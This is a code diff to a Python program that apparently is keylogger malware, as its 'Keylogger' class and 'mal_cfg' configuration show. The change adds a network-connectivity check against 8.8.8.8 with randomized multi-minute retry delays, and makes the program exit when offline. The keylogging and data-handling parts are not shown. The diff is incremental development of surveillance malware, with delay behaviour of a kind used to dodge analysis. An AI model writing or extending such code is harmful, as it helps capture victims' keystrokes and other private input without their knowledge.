@@ -17,6 +17,8 @@ import dns.exception
 import dns.resolver
 import logging
 import logging.handlers
+import random
+import socket
 import sys
 import time
 
@@ -44,6 +46,24 @@ def aes_factory(cfg):
     digest.update(bytes(password, 'utf8'))
     key = base64.urlsafe_b64encode(digest.finalize())
     return Fernet(key)
+
+
+def check_internet(host='8.8.8.8', port=53, timeout=3):
+    socket.setdefaulttimeout(timeout)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    flag = None
+    retries = 3
+    while True:
+        errno = sock.connect_ex((host, port))
+        if errno == 0:
+            sock.shutdown(socket.SHUT_RDWR)
+            sock.close()
+            return True
+        retries -= 1
+        if retries == 0:
+            sock.close()
+            return False
+        time.sleep(random.randint((60 * 1), (60 * 10)))
 
 
 mal_cfg = cfg_factory(cfg)
@@ -126,4 +146,6 @@ class Keylogger(object):
 
 
 if __name__ == '__main__':
-    pass
+    connectivity = check_internet()
+    if not connectivity:
+        sys.exit(1)
